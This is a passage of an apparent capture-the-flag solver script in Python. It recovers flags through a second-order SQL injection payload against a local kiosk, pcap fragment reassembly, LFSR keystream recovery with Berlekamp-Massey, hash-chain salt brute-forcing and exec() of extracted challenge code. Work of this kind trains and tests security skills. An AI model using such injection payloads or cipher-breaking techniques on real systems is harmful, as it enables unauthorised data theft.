        assert "welcome back" in kiosk("login", M01_HONEYPOT, admin_pw), "auth layer unsolved"

        # stage 1 store -> stage 2 sync stores the derived alias -> stage 3 load
        desired = f"x' UNION SELECT owner, secret FROM {ledger} WHERE '1'='1"
        payload = _m01_unmangle(desired)
        kiosk("register", payload, "x")
        assert "alias not synced" in kiosk("load", payload), "single-stage payload unexpectedly worked"
        kiosk("sync", payload)
        out = kiosk("load", payload)
        mm = re.search(r"FTA\{[a-z0-9_]+\}", out)
        assert mm, f"no flag leaked; kiosk output:\n{out}"
        _record("M01", mm.group(0), "honeypot crack + HMAC session + second-order stored SQLi")
    finally:
        shutil.rmtree(work, ignore_errors=True)


# ---------------------------------------------------------------------------
# M02 - IPv4 fragment reassembly + nested frame seals + session-nonce LCG mask
# ---------------------------------------------------------------------------
M02_OUTER_MAGIC = 0xDEAD1A70
M02_OUTER_MAGIC_BYTES = struct.pack("<I", M02_OUTER_MAGIC)
M02_INNER_MAGIC = 0x1A70C0DE
M02_INNER_MAGIC_BYTES = struct.pack("<I", M02_INNER_MAGIC)
M02_SESSION_MAGIC = 0x5E5510A5
M02_SESSION_MAGIC_BYTES = struct.pack("<I", M02_SESSION_MAGIC)
M02_OUTER_TYPE_DATA = 0x0A
M02_INNER_VER = 1
M02_INNER_TYPE_FRAG = 0x5C


def _m02_keystream(nonce, seq, n):
    state = ((seq * 0x9E3779B1) ^ nonce ^ 0xA5A5A5A5) & 0xFFFFFFFF
    out = bytearray(n)
    for i in range(n):
        state = (state * 1664525 + 1013904223) & 0xFFFFFFFF
        out[i] = (state >> 24) & 0xFF
    return bytes(out)


def _m02_iter_pcap(raw):
    assert struct.unpack("<I", raw[:4])[0] == 0xA1B2C3D4, "unsupported pcap magic"
    off, n = 24, len(raw)
    while off + 16 <= n:
        _ts, _tu, incl, _orig = struct.unpack("<IIII", raw[off:off + 16])
        off += 16
        yield raw[off:off + incl]
        off += incl


def _m02_reassemble(packets):
    groups, order = {}, []
    for pkt in packets:
        if len(pkt) < 20 or (pkt[0] >> 4) != 4:
            continue
        ihl = (pkt[0] & 0x0F) * 4
        if ihl < 20 or len(pkt) < ihl or pkt[9] != 6:
            continue
        total = (pkt[2] << 8) | pkt[3]
        ident = (pkt[4] << 8) | pkt[5]
        fo = (pkt[6] << 8) | pkt[7]
        off = (fo & 0x1FFF) * 8
        key = (bytes(pkt[12:16]), bytes(pkt[16:20]), ident, pkt[9])
        groups.setdefault(key, [])
        if key not in order:
            order.append(key)
        groups[key].append((off, pkt[ihl:min(total, len(pkt))]))
    return [b"".join(s for _o, s in sorted(groups[k], key=lambda t: t[0])) for k in order]


def _m02_tcp_data(seg):
    if len(seg) < 20:
        return b""
    doff = (seg[12] >> 4) * 4
    return seg[doff:] if 20 <= doff <= len(seg) else b""


def _m02_iter_outer(payload):
    i = 0
    while True:
        j = payload.find(M02_OUTER_MAGIC_BYTES, i)
        if j < 0 or j + 14 > len(payload):
            return
        otype, olen = struct.unpack("<HH", payload[j + 4:j + 8])
        end = j + 14 + olen
        if olen > 8192 or end + 4 > len(payload):
            i = j + 1
            continue
        oseq = struct.unpack("<I", payload[j + 8:j + 12])[0]
        pl = payload[j + 14:end]
        seal = struct.unpack("<I", payload[end:end + 4])[0]
        crc = zlib.crc32(pl, zlib.crc32(payload[j:j + 12]))     # route bytes skipped
        yield dict(otype=otype, oseq=oseq, payload=pl, seal_ok=(crc & 0xFFFFFFFF) == seal)
        i = end + 4


def _m02_parse_inner(pl):
    k = pl.find(M02_INNER_MAGIC_BYTES)
    if k < 0 or k + 12 > len(pl):
        return None
    magic, ver, itype, iseq = struct.unpack("<IBBI", pl[k:k + 10])
    if magic != M02_INNER_MAGIC:
        return None
    ilen = struct.unpack("<H", pl[k + 10:k + 12])[0]
    if k + 12 + ilen > len(pl):
        return None
    return ver, itype, iseq, pl[k + 12:k + 12 + ilen]


def solve_m02():
    raw = (part("M02") / "airport_traffic.pcap").read_bytes()
    segments = _m02_reassemble(list(_m02_iter_pcap(raw)))

    frags, nonce, n_frames = [], None, 0
    for seg in segments:
        payload = _m02_tcp_data(seg)
        if not payload:
            continue
        for fr in _m02_iter_outer(payload):
            n_frames += 1
            if nonce is None and len(fr["payload"]) >= 8 and fr["payload"][:4] == M02_SESSION_MAGIC_BYTES:
                nonce = struct.unpack("<I", fr["payload"][4:8])[0]
            if not fr["seal_ok"] or fr["otype"] != M02_OUTER_TYPE_DATA:
                continue
            inner = _m02_parse_inner(fr["payload"])
            if inner is None:
                continue
            ver, itype, iseq, masked = inner
            if ver != M02_INNER_VER or itype != M02_INNER_TYPE_FRAG or nonce is None:
                continue
            ks = _m02_keystream(nonce, iseq, len(masked))
            frags.append((iseq, bytes(a ^ b for a, b in zip(masked, ks))))
    assert frags, "no validated fragments"
    frags.sort(key=lambda t: t[0])
    flag = "".join(d.decode("ascii") for _s, d in frags)
    _record("M02", flag, f"IPv4 reassembly + nested seals + session-nonce LCG ({len(frags)} frags)")


# ---------------------------------------------------------------------------
# M03 - keyed hash chain + triple-nested delta repair
# ---------------------------------------------------------------------------
M03_BLOCK = 100
M03_W = 7
M03_XOR_MUL = 0x5D
M03_XOR_ADD = 0x1F
M03_MAGIC_A = b"AUD4"
M03_MAGIC_B = b"AUDB"
M03_DOM_SALT = b"LSPD/chain-salt|"
M03_DOM_KA = b"AUD4-A|"
M03_DOM_KB = b"AUD4-B|"


def _m03_hmac_hex(key, msg):
    return hmac.new(key, msg, hashlib.sha256).hexdigest()


def _m03_keystream(key, n):
    out, ctr = bytearray(), 0
    while len(out) < n:
        out += hashlib.sha256(key + struct.pack("<I", ctr)).digest()
        ctr += 1
    return bytes(out[:n])


def _m03_rotr(b, r):
    return ((b >> r) | (b << (8 - r))) & 0xFF


def _m03_content(ln):
    return "|".join(ln.split("|")[:4])


def _m03_code_class(ec):
    return int(hashlib.sha256(ec.encode()).hexdigest()[0], 16) & 1


def _m03_block_msg(b, contents):
    return (f"block={b}|" + "".join(contents)).encode()


def _m03_derive_salt(prev_root):
    return hashlib.sha256(M03_DOM_SALT + prev_root.encode()).digest()[:2]


def _m03_rot_of(root_last):
    return (int(root_last, 16) % 7) + 1


def _m03_recover_salt(lines, root1):
    msg = _m03_block_msg(1, [_m03_content(ln) for ln in lines[:M03_BLOCK]])
    for k in range(1 << 16):
        key = k.to_bytes(2, "big")
        if _m03_hmac_hex(key, msg) == root1:
            return key
    raise ValueError("M03 bootstrap salt not recovered")


def _m03_derive_salts(roots, bootstrap):
    salts = [bootstrap]
    for b in range(2, len(roots) + 1):
        salts.append(_m03_derive_salt(roots[b - 2]))
    return salts


def _m03_find_breaks(lines, salts):
    prev, breaks = "0" * 64, []
    for idx, ln in enumerate(lines):
        content = _m03_content(ln)
        if _m03_hmac_hex(salts[idx // M03_BLOCK], (prev + content).encode()) != ln.split("|")[4]:
            breaks.append(idx)
        prev = ln.split("|")[4]
    return breaks


def _m03_recompute_roots(lines, salts):
    roots = []
    for b in range(1, len(salts) + 1):
        chunk = [_m03_content(ln) for ln in lines[(b - 1) * M03_BLOCK:b * M03_BLOCK]]
        roots.append(_m03_hmac_hex(salts[b - 1], _m03_block_msg(b, chunk)))
    return roots


def _m03_rle_decode(blob):
    out, i = bytearray(), 0
    while i < len(blob):
        op = blob[i]
        if op == 0x00:
            n = blob[i + 1]
            out.extend(blob[i + 2:i + 2 + n])
            i += 2 + n
        else:
            out.extend(bytes([blob[i + 1]]) * op)
            i += 2
    return bytes(out)


def _m03_transpose_inv(t, w, n):
    rows = len(t) // w
    padded = bytearray(rows * w)
    idx = 0
    for c in range(w):
        for r in range(rows):
            padded[r * w + c] = t[idx]
            idx += 1
    return bytes(padded[:n])


def _m03_decode_record(blob, raw_len, r, ka):
    # undo stage 5 (rotate-right), stage 4 (key XOR), stage 3 (transpose),
    # stage 2 (index XOR), stage 1 (RLE)
    x = bytes(_m03_rotr(b, r) for b in blob)
    x = bytes(b ^ k for b, k in zip(x, _m03_keystream(ka, len(x))))
    x = _m03_transpose_inv(x, M03_W, raw_len)
    x = bytes(b ^ ((i * M03_XOR_MUL + M03_XOR_ADD) & 0xFF) for i, b in enumerate(x))
    return _m03_rle_decode(x).decode()


def _m03_parse_region_a(data, bootstrap, root_last):
    assert data[:4] == M03_MAGIC_A, "bad region-A magic"
    assert data[4] == M03_W, f"unexpected width {data[4]}"
    count = struct.unpack("<H", data[5:7])[0]
    r = _m03_rot_of(root_last)
    ka = M03_DOM_KA + bootstrap
    off, out = 7, {}
    for _ in range(count):
        seq = struct.unpack("<H", data[off:off + 2])[0]
        rlen = struct.unpack("<I", data[off + 2:off + 6])[0]
        blen = struct.unpack("<I", data[off + 6:off + 10])[0]
        blob = data[off + 10:off + 10 + blen]
        out[seq] = _m03_decode_record(blob, rlen, r, ka)
        off += 10 + blen
    return out, off


def _m03_parse_region_b(data, off, root_last, last_original):
    assert data[off:off + 4] == M03_MAGIC_B, "bad region-B magic"
    blen = struct.unpack("<H", data[off + 4:off + 6])[0]
    masked = data[off + 6:off + 6 + blen]
    kb = M03_DOM_KB + root_last.encode() + b"|" + last_original.encode()
    return bytes(m ^ k for m, k in zip(masked, _m03_keystream(kb, len(masked))))


def _m03_predicate_token(lines):
    evens, odds = [], []
    for ln in lines:
        ec = ln.split("|")[2]
        if ec.endswith("_ACCEPT"):
            (evens if _m03_code_class(ec) == 0 else odds).append(ec[0])
    assert len(evens) == len(odds), f"class columns uneven: {len(evens)}/{len(odds)}"
    return "".join(chr(ord(a) ^ ord(b)) for a, b in zip(evens, odds))


def solve_m03():
    lines = [ln for ln in (part("M03") / "lspd_auth.log").read_text(encoding="utf-8").splitlines() if ln.strip()]
    roots = re.findall(r"digest=([0-9a-f]{64})",
                       (part("M03") / "CHAIN_SPEC.txt").read_text(encoding="utf-8"))
    assert roots, "no checkpoint roots found in CHAIN_SPEC.txt"
    bootstrap = _m03_recover_salt(lines, roots[0])
    salts = _m03_derive_salts(roots, bootstrap)

    breaks = _m03_find_breaks(lines, salts)
    assert len(breaks) == 3, f"expected 3 forged records, found {len(breaks)}"
    assert len({(i // M03_BLOCK) + 1 for i in breaks}) >= 2, "forgeries confined to one block"

    delta = (part("M03") / "audit_delta.bin").read_bytes()
    originals, off = _m03_parse_region_a(delta, bootstrap, roots[-1])
    last_original = originals[max(originals)]
    mask = _m03_parse_region_b(delta, off, roots[-1], last_original)

    fixed = list(lines)
    for idx, ln in enumerate(lines):
        seq, _ts, _ec, _d, h = ln.split("|")
        if int(seq) in originals:
            fixed[idx] = f"{originals[int(seq)]}|{h}"
    assert _m03_find_breaks(fixed, salts) == [], "chain still broken after repair"
    assert _m03_recompute_roots(fixed, salts) == roots, "block roots still broken after repair"

    token = _m03_predicate_token(fixed)
    assert len(token) == len(mask), (len(token), len(mask))
    flag = bytes(ord(c) ^ m for c, m in zip(token, mask)).decode()
    _record("M03", flag,
            f"salt-schedule keyed chain + repair 3 forgeries in {len(lines)} records + 5-deep delta")


# ---------------------------------------------------------------------------
# M04 - round-robin 3-register keystream (BM x2 + GF(2) linear solve) + transpose
# ---------------------------------------------------------------------------
M04_HEADER = ("LSPD EMERGENCY RADIO NET :: BEACON SYNC :: ALL UNITS COPY?"
              ).ljust(64, " ").encode()
M04_REDACT_FROM = 15
M04_BLOCK = 8
M04_HDR_MAGIC = b"RDRX"
M04_HDR_LEN = 16
M04_T2B = 16
M04_BEACON = 2


def _m04_bytes_to_bits(b):
    return [(byte >> sh) & 1 for byte in b for sh in range(7, -1, -1)]


def _m04_bits_to_bytes(bits):
    out = bytearray()
    for i in range(0, (len(bits) // 8) * 8, 8):
        v = 0
        for b in bits[i:i + 8]:
            v = (v << 1) | b
        out.append(v)
    return bytes(out)


def _m04_bm(s):
    C, B, L, m = [1], [1], 0, 1
    for i in range(len(s)):
        if len(C) < L + 1:
            C += [0] * (L + 1 - len(C))
        d = s[i] & 1
        for j in range(1, L + 1):
            d ^= C[j] & s[i - j]
        if d:
            T = C[:]
            need = len(B) + m
            if len(C) < need:
                C += [0] * (need - len(C))
            for j in range(len(B)):
                C[j + m] ^= B[j]
            if 2 * L <= i:
                L, B, m = i + 1 - L, T, 1
            else:
                m += 1
        else:
            m += 1
    return C[:L + 1], L


def _m04_extend(bits, C, L, n):
    r = list(bits)
    while len(r) < n:
        i = len(r)
        d = 0
        for j in range(1, L + 1):
            d ^= C[j] & r[i - j]
        r.append(d)
    return r


def _m04_lfsr(seed_state, taps, length):
    state, deg, bits = seed_state, max(taps), []
    for _ in range(length * 8):
        out = 0
        for t in taps:
            out ^= (state >> (deg - t)) & 1
        bits.append(state & 1)
        state = (state >> 1) | (out << (deg - 1))
    return bytes(int("".join(str(b) for b in bits[i:i + 8]), 2) for i in range(0, len(bits), 8))


def _m04_state_outputs(state, taps, n):
    deg, bits, st = max(taps), [], state
    for _ in range(n):
        out = 0
        for t in taps:
            out ^= (st >> (deg - t)) & 1
        bits.append(st & 1)
        st = (st >> 1) | (out << (deg - 1))
    return bits


def _m04_gf2_solve(mat, rhs):
    rows = [row[:] + [bb] for row, bb in zip(mat, rhs)]
    ncols = len(mat[0])
    pivot_row, pivots = 0, []
    for col in range(ncols):
        pr = next((r for r in range(pivot_row, len(rows)) if rows[r][col]), None)
        if pr is None:
            continue
        rows[pivot_row], rows[pr] = rows[pr], rows[pivot_row]
        for r in range(len(rows)):
            if r != pivot_row and rows[r][col]:
                rows[r] = [a ^ c for a, c in zip(rows[r], rows[pivot_row])]
        pivots.append((pivot_row, col))
        pivot_row += 1
    x = [0] * ncols
    for pr, col in pivots:
        x[col] = rows[pr][-1]
    return x


def _m04_recover_beacon(known_bits, taps):
    deg = max(taps)
    cols = [_m04_state_outputs(1 << j, taps, len(known_bits)) for j in range(deg)]
    mat = [[cols[j][t] for j in range(deg)] for t in range(len(known_bits))]
    x = _m04_gf2_solve(mat, list(known_bits))
    seed = 0
    for j, bit in enumerate(x):
        seed |= (bit & 1) << j
    return seed


def _m04_parse_header(pkt):
    assert pkt[:4] == M04_HDR_MAGIC, "bad sync magic"
    _ver, off, burst, bdeg = struct.unpack("<BBBB", pkt[4:8])
    mask = struct.unpack("<I", pkt[8:12])[0]
    taps = [t for t in range(mask.bit_length()) if (mask >> t) & 1]
    _mode, xk, _flav = struct.unpack("<BBB", pkt[12:15])
    crc_ok = ((sum(pkt[:15]) ^ 0xA5) & 0xFF) == pkt[15]
    return off, burst, bdeg, taps, xk, crc_ok


def _m04_lane_counts(n, burst, off):
    counts = [0, 0, 0]
    ng = (n + burst - 1) // burst
    for g in range(ng):
        counts[(g + off) % 3] += min(burst, n - g * burst)
    return counts


def _m04_demux(exposed, burst, off):
    lanes = [[], [], []]
    for i, mb in enumerate(exposed):
        lanes[((i // burst) + off) % 3].append(mb)
    return lanes


def _m04_assign(n, streams, burst, off):
    ng = (n + burst - 1) // burst
    pos = [0, 0, 0]
    out = bytearray(n)
    for g in range(ng):
        r = (g + off) % 3
        base = g * burst
        blk = min(burst, n - base)
        for j in range(blk):
            out[base + j] = streams[r][pos[r]]
            pos[r] += 1
    return bytes(out)


def _m04_permutation(n, block=M04_BLOCK):
    perm = [0] * n
    idx = 0
    for j in range(block):
        for bb in range((n + block - 1) // block):
            src = bb * block + j
            if src < n:
                perm[src] = idx
                idx += 1
    return perm


def _m04_unpermute(data, block=M04_BLOCK):
    n = len(data)
    perm = _m04_permutation(n, block)
    out = bytearray(n)
    for p in range(n):
        out[p] = data[perm[p]]
    return bytes(out)


def _m04_recover_mask(sample, packet, n):
    off, burst, _bdeg, btaps, _xk, _crc = _m04_parse_header(packet)
    exposed = bytes(s ^ h for s, h in zip(sample, M04_HEADER))[:M04_REDACT_FROM]
    lanes = _m04_demux(exposed, burst, off)
    counts = _m04_lane_counts(n, burst, off)
    streams = [None, None, None]
    for r in (0, 1):
        bits = _m04_bytes_to_bits(bytes(lanes[r]))
        C, dd = _m04_bm(bits)
        streams[r] = _m04_bits_to_bytes(_m04_extend(bits, C, dd, counts[r] * 8))
    known = _m04_bytes_to_bits(bytes(lanes[M04_BEACON]))[:counts[M04_BEACON] * 8]
    seed = _m04_recover_beacon(known, btaps)
    streams[M04_BEACON] = _m04_lfsr(seed, btaps, counts[M04_BEACON])
    return _m04_assign(n, streams, burst, off)


def _m04_wash_stream(n, header):
    return bytes(header[i % len(header)] for i in range(n))


def _m04_unspin(data, span=M04_T2B, k=0):
    """Inverse of the transmitter's left-rotate of each 16-byte span."""
    out = bytearray(len(data))
    for base in range(0, len(data), span):
        blk = data[base:base + span]
        m = len(blk)
        kk = k % m if m else 0
        out[base:base + m] = (blk[m - kk:] + blk[:m - kk]) if kk else blk
    return bytes(out)


def solve_m04():
    sample = (part("M04") / "keystream_sample.bin").read_bytes()
    packet = (part("M04") / "radio_packet.bin").read_bytes()
    off, burst, bdeg, taps, xk, crc_ok = _m04_parse_header(packet)
    assert crc_ok, "sync header checksum mismatch"
    ct = packet[M04_HDR_LEN:]
    mask = _m04_recover_mask(sample, packet, len(ct))
    washed = bytes(c ^ w for c, w in zip(ct, _m04_wash_stream(len(ct), packet[:M04_HDR_LEN])))
    transposed = _m04_unspin(washed, M04_T2B, xk)
    plaintext = bytes(p ^ k for p, k in zip(_m04_unpermute(transposed), mask))
    mm = re.search(rb"FTA\{[^}]+\}", plaintext)
    assert mm, f"no flag in decoded message: {plaintext!r}"
    _record("M04", mm.group(0).decode(),
            f"3-lane BM/GF(2) mask + WASH/SPIN(key={xk}) + 8B transpose "
            f"(off={off},burst={burst},deg={bdeg},taps={taps})")


# ---------------------------------------------------------------------------
# M05 - lock-repaired dispatcher + 32-bit overflow + triple-bug stage 2 + stage 3
# ---------------------------------------------------------------------------
M05_MASK32 = 0xFFFFFFFF
M05_MASK64 = (1 << 64) - 1
M05_THIRD_KEY = bytes((0x5A, 0xC3, 0x77, 0x21))
M05_ROT_SEED = 0x9E3779B9
M05_MIX_SEED = 0x123456789ABCDEF0


def _m05_load_bd():
    import importlib.util
    p = part("M05") / "broken_dispatch.py"
    spec = importlib.util.spec_from_file_location("m05_broken_dispatch", str(p))
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


def _m05_splitmix64(x):
    x &= M05_MASK64
    x = (x + 0x9E3779B97F4A7C15) & M05_MASK64
    x = ((x ^ (x >> 30)) * 0xBF58476D1CE4E5B9) & M05_MASK64
    x = ((x ^ (x >> 27)) * 0x94D049BB133111EB) & M05_MASK64
    return (x ^ (x >> 31)) & M05_MASK64


def _m05_seal_digest(ledger, mix, dispatched):
    h = ledger & M05_MASK64
    h ^= _m05_splitmix64((mix & M05_MASK64) ^ 0xA5A5A5A5A5A5A5A5)
    h ^= _m05_splitmix64((dispatched & M05_MASK64) ^ 0x5A5A5A5A5A5A5A5A)
    return _m05_splitmix64(h)


def _m05_derive_key(ledger, mix, dispatched):
    return _m05_splitmix64(_m05_seal_digest(ledger, mix, dispatched) ^ 0x0D15A7C4C0DE0000)


def _m05_dstream(seed, length):
    h = seed & M05_MASK32
    out = bytearray()
    for _ in range(length):
        h = (h * 1664525 + 1013904223) & M05_MASK32
        out.append((h >> 24) & 0xFF)
    return bytes(out)


def _m05_gate(data, key):
    return bytes(a ^ b for a, b in zip(data, _m05_dstream(key ^ 0x61E7A11, len(data))))


def _m05_extra_unwrap(data, key):
    ks = _m05_dstream(key ^ 0xE47A5EED, len(data))
    out = bytearray(b ^ k for b, k in zip(data, ks))
    s = key & 0x7
    if s:
        out = out[-s:] + out[:-s]
    return bytes(out)


def _m05_rotl32(x, r, masked=True):
    if masked:
        x &= M05_MASK32
    v = (x << r) | (x >> (32 - r))
    return v & M05_MASK32 if masked else v


def _m05_fold(tags, start, masked=True):
    h = start
    for t in tags:
        h = (h + t) & M05_MASK32
        h = _m05_rotl32(h, 7, masked)
        h ^= h >> 16
        h = (h * 0x9E3779B9) & M05_MASK32
    return h & M05_MASK32


def _m05_ks32(seed, length):
    h = seed & M05_MASK32
    out = bytearray()
    for _ in range(length):
        h = (h * 1103515245 + 12345) & M05_MASK32
        out.append((h >> 16) & 0xFF)
    return bytes(out)


def _m05_wrap_decode(payload):
    x = base64.b64decode(payload)
    return bytes(b ^ M05_THIRD_KEY[i % 4] for i, b in enumerate(x))


def _m05_stage3(data):
    rot = M05_ROT_SEED
    expanded = bytearray(len(data))
    for k, b in enumerate(data):
        rot = ((rot << 1) | (rot >> 31)) & M05_MASK32
        expanded[k] = b ^ ((rot >> 7) & 0xFF)
    fb = bytearray()
    k = 0
    while k < len(expanded):
        fb.extend([expanded[k]] * expanded[k + 1])
        k += 2
    return bytes(fb)


class _M05FixedNode:
    """Repaired depot node: ONE lock guards the whole critical section, so the
    per-lane tally, the running ledger AND the running mix commit atomically."""

    def __init__(self, packets, workers=8):
        self.lock = threading.Lock()
        self.ledger = 0
        self.mix = M05_MIX_SEED
        self.lanes = {}
        self.queue = queue.Queue()
        for p in packets:
            self.queue.put(p)
        self.workers = workers

    def clear_packet(self, pkt):
        with self.lock:
            self.ledger = (self.ledger + pkt["tag"]) & M05_MASK64
            self.mix = (self.mix + _m05_splitmix64(pkt["tag"])) & M05_MASK64
            self.lanes[pkt["lane"]] = self.lanes.get(pkt["lane"], 0) + 1

    def _worker(self):
        while True:
            try:
                pkt = self.queue.get_nowait()
            except queue.Empty:
                return
            self.clear_packet(pkt)

    def run(self):
        ts = [threading.Thread(target=self._worker) for _ in range(self.workers)]
        [t.start() for t in ts]
        [t.join() for t in ts]


def _m05_correct_triple():
    packets = json.loads((part("M05") / "dispatch_packets.json").read_text(encoding="utf-8"))
    node = _M05FixedNode(packets)
    node.run()
    assert sum(node.lanes.values()) == len(packets)
    assert node.ledger == sum(p["tag"] for p in packets) & M05_MASK64
    m = M05_MIX_SEED
    for p in packets:
        m = (m + _m05_splitmix64(p["tag"])) & M05_MASK64
    assert node.mix == m
    return node.ledger, node.mix, len(packets)


def _m05_unmask_programs(bd):
    ledger, mix, dispatched = _m05_correct_triple()
    digest = _m05_seal_digest(ledger, mix, dispatched)
    s2_raw = base64.b64decode(bd.SEALED_STAGE2_B64)
    asm_raw = base64.b64decode(bd.SEALED_ASSEMBLE_B64)
    s2 = bytes(a ^ b for a, b in zip(s2_raw, bd.keystream(digest, len(s2_raw))))
    asm = bytes(a ^ b for a, b in zip(asm_raw, bd.keystream(digest, len(asm_raw))))
    return (ledger, mix, dispatched), s2.decode("utf-8"), asm.decode("utf-8")


def _m05_stage2_lane(tags, sealed, salt, *, rot_masked=True, rec_buggy=False,
                     align_buggy=False, start=0x1BADB002):
    h = _m05_fold(tags, start, rot_masked)
    plain = bytes(a ^ b for a, b in zip(sealed, _m05_ks32(h ^ salt, len(sealed))))
    n = (int.from_bytes(plain[0:2], "little") if rec_buggy
         else int.from_bytes(plain[0:2], "big"))
    body = plain[3:3 + n] if rec_buggy else plain[2:2 + n]
    span = n + 1 if (align_buggy and (n & 3) == 0) else n
    trailer = int.from_bytes(plain[2 + span:6 + span], "big")
    if (sum(body) & 0xFFFF) != trailer:
        raise ValueError("reconciliation record failed its trailer check")
    return body


def _m05_assemble_peel(R0, R1, key):
    dispatch = bytes(a ^ b for a, b in zip(R0, R1))
    inner = _m05_gate(dispatch, key)
    wrapped = _m05_extra_unwrap(inner, key)
    return _m05_stage3(_m05_wrap_decode(wrapped))


def solve_m05():
    bd = _m05_load_bd()
    (ledger, mix, dispatched), s2_src, _asm_src = _m05_unmask_programs(bd)
    assert "def signature" in s2_src and "def extract_record" in s2_src

    ns = {"__name__": "stage2_extracted"}
    exec(compile(s2_src, "<stage2>", "exec"), ns)
    tags = ns["TAGS"]

    # Correct repair: mask the rotate, big-endian @2, trailer @2+n, and CONTINUE
    # the signature across the two lanes (bug (d) only bites the second run).
    h0 = _m05_fold(tags, 0x1BADB002, True)
    R0 = _m05_stage2_lane(tags, ns["SEALED0"], ns["SALT0"], start=0x1BADB002)
    R1 = _m05_stage2_lane(tags, ns["SEALED1"], ns["SALT1"], start=h0)
    key = _m05_derive_key(ledger, mix, dispatched)

    # Trap: an un-chained lane 1 (bug (d)) is structurally valid garbage, never
    # the flag.
    try:
        bad = _m05_stage2_lane(tags, ns["SEALED1"], ns["SALT1"], start=0x1BADB002)
        badflag = _m05_assemble_peel(R0, bad, key)
    except Exception:
        badflag = None
    assert badflag != FL["M05"].encode(), "unchained lane-1 yielded the flag"

    flag = _m05_assemble_peel(R0, R1, key).decode("ascii")
    _record("M05", flag,
            f"lock-repaired race triple (ledger/mix/dispatched={dispatched}) + 4-bug "
            f"reconciler + gate/extra-wrap/stage-3")


# ---------------------------------------------------------------------------
# H01 - stripped ELF: three chained CF-flattened VMs + two-pass vault + 4 gates
# ---------------------------------------------------------------------------
H01_MOD = 251
H01_MAXLEN = 200
H01_PERM = set(range(256))
H01_M64 = (1 << 64) - 1
H01_CRC_XOR = 0x13579BDF
H01_SEED2_MUL = 0x2545F4914F6CDD1D
H01_CFG, H01_XT1, H01_XT2, H01_XT3 = b"ZCFG", b"ZXT1", b"ZXT2", b"ZXT3"
H01_VM1, H01_VM2, H01_VM3, H01_VLT = b"ZVM1", b"ZVM2", b"ZVM3", b"ZDVL"
H01_OFF_SBOX = 4
H01_OFF_K = H01_OFF_SBOX + 256
H01_CIPHER_LEN = H01_OFF_K + 2 * H01_MAXLEN + 16
(H01_NOP, H01_PUSH, H01_DROP, H01_ADD, H01_SUB, H01_XOR, H01_AND, H01_OR, H01_MUL,
 H01_SHL, H01_SHR, H01_DUP, H01_SWAP, H01_JMP, H01_JZ, H01_JNZ, H01_HALT) = range(17)


def _wsl_path(p):
    s = str(p).replace("\\", "/")
    return "/mnt/" + s[0].lower() + s[2:]


def _h01_splitmix64(z):
    z = (z + 0x9E3779B97F4A7C15) & H01_M64
    z = ((z ^ (z >> 30)) * 0xBF58476D1CE4E5B9) & H01_M64
    z = ((z ^ (z >> 27)) * 0x94D049BB133111EB) & H01_M64
    return (z ^ (z >> 31)) & H01_M64


def _h01_derive_seed(c, length, env, v1, v2, v3):
    s = (c ^ ((length * 0x9E3779B97F4A7C15) & H01_M64) ^ ((env << 33) & H01_M64)
         ^ ((v1 << 7) & H01_M64) ^ v2 ^ ((v3 << 17) & H01_M64)) & H01_M64
    return _h01_splitmix64(s)


def _h01_keystream(seed, n):
    st = (seed | 1) & H01_M64
    out = bytearray()
    for _ in range(n):
        x = st
        x ^= (x << 13) & H01_M64
        x ^= x >> 7
        x ^= (x << 17) & H01_M64
        x &= H01_M64
        st = x
        out.append(x & 0xFF)
    return bytes(out)


def _h01_fnv1a(b):
    h = 2166136261
    for x in b:
        h = ((h ^ x) * 16777619) & 0xFFFFFFFF
    return h


def _h01_hmix(b, seed):
    h = (seed ^ (seed >> 32)) & 0xFFFFFFFF
    for x in b:
        h = (h ^ x) & 0xFFFFFFFF
        h = (h * 16777619) & 0xFFFFFFFF
        h = (h ^ (h >> 15)) & 0xFFFFFFFF
        h = (h * 2246822519) & 0xFFFFFFFF
    return h


def _h01_seed2_of(seed, v3):
    return _h01_splitmix64((seed ^ ((v3 * H01_SEED2_MUL) & H01_M64)
                            ^ 0x9E3779B97F4A7C15) & H01_M64)


def _h01_decrypt_vault(cipher, seed, v3):
    a = _h01_keystream(seed, len(cipher))
    b = _h01_keystream(_h01_seed2_of(seed, v3), len(cipher))
    return bytes(c ^ x ^ y for c, x, y in zip(cipher, a, b))


def _h01_gate_crc(b, salt):
    h = salt & 0xFFFFFFFF
    for x in b:
        h = (h ^ x) & 0xFFFFFFFF
        for _ in range(8):
            h = ((h >> 1) ^ 0xEDB88320) if (h & 1) else (h >> 1)
            h &= 0xFFFFFFFF
    return h


def _h01_gate_pos(b, seed):
    h = (seed ^ (seed >> 29)) & 0xFFFFFFFF
    for i, x in enumerate(b):
        h = (h + x + i) & 0xFFFFFFFF
        h = ((h << 5) | (h >> 27)) & 0xFFFFFFFF
        h = (h ^ ((x * 0x9E3779B1) & 0xFFFFFFFF)) & 0xFFFFFFFF
    return h


def _h01_vm_run(code, xlat):
    st, ip, n = [], 0, len(code)
    while True:
        if ip < 0 or ip >= n:
            return st[-1] & 0xFFFFFFFF if st else 0
        op = xlat[code[ip]]
        ip += 1
        if op == H01_NOP:
            continue
        if op == H01_PUSH:
            st.append(code[ip] & 0xFF)
            ip += 1
        elif op == H01_DROP:
            if st:
                st.pop()
        elif op in (H01_ADD, H01_SUB, H01_XOR, H01_AND, H01_OR, H01_MUL):
            b = st.pop() if st else 0
            a = st.pop() if st else 0
            r = {H01_ADD: a + b, H01_SUB: a - b, H01_XOR: a ^ b,
                 H01_AND: a & b, H01_OR: a | b, H01_MUL: a * b}[op]
            st.append(r & 0xFFFFFFFF)
        elif op == H01_SHL:
            imm = code[ip] & 0xFF
            ip += 1
            st.append(((st.pop() if st else 0) << (imm & 31)) & 0xFFFFFFFF)
        elif op == H01_SHR:
            imm = code[ip] & 0xFF
            ip += 1
            st.append(((st.pop() if st else 0) >> (imm & 31)) & 0xFFFFFFFF)
        elif op == H01_DUP:
            st.append(st[-1] if st else 0)
        elif op == H01_SWAP:
            if len(st) >= 2:
                st[-1], st[-2] = st[-2], st[-1]
        elif op == H01_JMP:
            rel = code[ip]
            ip += 1
            ip += rel - 256 if rel > 127 else rel
        elif op == H01_JZ:
            rel = code[ip]
            ip += 1
            if (st.pop() if st else 0) == 0:
                ip += rel - 256 if rel > 127 else rel
        elif op == H01_JNZ:
            rel = code[ip]
            ip += 1
            if (st.pop() if st else 0) != 0:
                ip += rel - 256 if rel > 127 else rel
        elif op == H01_HALT:
            return st[-1] & 0xFFFFFFFF if st else 0
        else:
            return 0xDEADBEEF


def _h01_find_magic(data, magic):
    hits, start = [], 0
    while True:
        j = data.find(magic, start)
        if j < 0:
            break
